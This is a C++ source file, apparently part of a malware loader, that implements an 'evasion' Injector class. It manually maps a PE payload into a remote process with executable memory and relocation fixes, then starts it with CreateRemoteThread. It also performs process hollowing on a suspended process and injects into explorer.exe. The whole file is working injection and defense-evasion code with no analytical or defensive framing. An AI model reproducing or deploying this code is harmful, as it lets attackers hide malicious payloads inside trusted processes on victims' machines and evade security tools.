#include "Injector.h"
#include "../utils/Logger.h"
#include <tlhelp32.h>
#include <algorithm>
#include <cwctype>

namespace evasion {

namespace {
    struct RELOC_ENTRY {
        WORD Offset : 12;
        WORD Type : 4;
    };
}

bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload) {
    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);

    // 1. Allocate memory in target process
    PBYTE pTargetBase = (PBYTE)VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pTargetBase) return false;

    // 2. Map headers
    if (!WriteProcessMemory(hProcess, pTargetBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) return false;

    // 3. Map sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        if (!WriteProcessMemory(hProcess, pTargetBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, NULL)) return false;
    }

    // 4. Handle Relocations (locally first, then write fixed sections)
    // Actually, it's easier to fix relocations in a local buffer and then write to target
    std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
    PBYTE pLocalBase = localMapping.data();

    // Copy everything to local buffer first
    memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        memcpy(pLocalBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
    }

    // Fix relocations in local buffer
    DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pLocalBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)(pReloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    if ((pEntry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddr = (PDWORD_PTR)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                        *pAddr += delta;
                    } else if ((pEntry[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                         PDWORD pAddr = (PDWORD)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                         *pAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // Write fixed image to target
    if (!WriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;

    // 5. Start thread at Entry Point
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
    if (!hThread) return false;

    CloseHandle(hThread);
    return true;
}

bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    if (!MapAndInject(pi.hProcess, payload)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                std::wstring targetProcess = processName;
                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload) {
    DWORD pid = GetProcessIdByName(L"explorer.exe");
    if (pid == 0) return false;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    bool success = MapAndInject(hProcess, payload);
    CloseHandle(hProcess);
    return success;
}

} // namespace evasion
